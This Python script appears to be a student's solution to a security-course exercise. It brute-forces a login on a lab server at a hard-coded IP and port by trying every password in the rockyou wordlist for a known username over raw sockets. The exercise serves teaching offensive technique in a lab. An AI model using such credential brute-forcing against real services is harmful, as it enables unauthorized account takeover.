import socket

host = "142.93.117.193" # IP address here
port = 1337 # Port here
wordlist = "/home/erickg/389Rfall18/week/2/rockyou.txt" # Point to wordlist file

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            the Briong server.
    """

    username = "kruegster\n"   # Hint: use OSINT
    password = ""   # Hint: use wordlist
    arr = []

 # data = s.recv(1024)
    #print(data)
    #s.send(username)
    fo = open(wordlist,"r")
    arr = fo.readlines()
    for line in arr:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        data = s.recv(1024)
        s.send(username)
        data = s.recv(1024)
        print(data)
        lineC = line + "\n"
        print(lineC)
        s.send(lineC)
        data = s.recv(1024)
        print(data)
        s.close()
#    s.send("something to send\n") #Send username
 #   data = s.recv(1024)
  #  print(data)



if __name__ == '__main__':
    brute_force()